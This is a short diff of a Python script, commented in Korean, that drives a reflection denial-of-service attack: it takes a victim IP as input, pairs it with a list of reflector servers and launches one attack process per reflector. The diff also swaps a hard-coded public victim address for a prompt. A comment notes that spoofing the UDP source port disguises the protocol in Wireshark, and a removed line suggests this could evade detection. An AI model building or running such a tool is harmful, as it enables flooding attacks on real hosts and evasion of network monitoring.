@@ -21,12 +21,12 @@ def DOS_RUN(ip_info):
 
 if __name__ == "__main__":
 
-    target_ip = "183.99.246.120"  # 피해 대상 IP
+    target_ip = input("Target IP : ")              # "10.0.0.129" 피해 대상 IP 예시
     reflector_ip_list = ["192.168.0.140", "192.168.0.200", "192.168.0.193", "192.168.0.202"]
     # 반사 서버 IP 리스트
 
     ip_info_list = [(target_ip, ref_ip) for ref_ip in reflector_ip_list]
-    # 피해대상 IP, 반사서버 IP를 재 조합하여 새로운 리스트 생성
+    # 피해대상 IP, 반사서버 IP를 조합하여 리스트 생성
 
     Process_List = list()
 
@@ -39,4 +39,3 @@ if __name__ == "__main__":
         Dos_Proc.join()
 
 # UDP 부분의 Source Port를 조작하게 되면 와이어샤크 상에서 표시되는 프로토콜 이름 조작가능
-# 탐지를 우회할 수도 ??
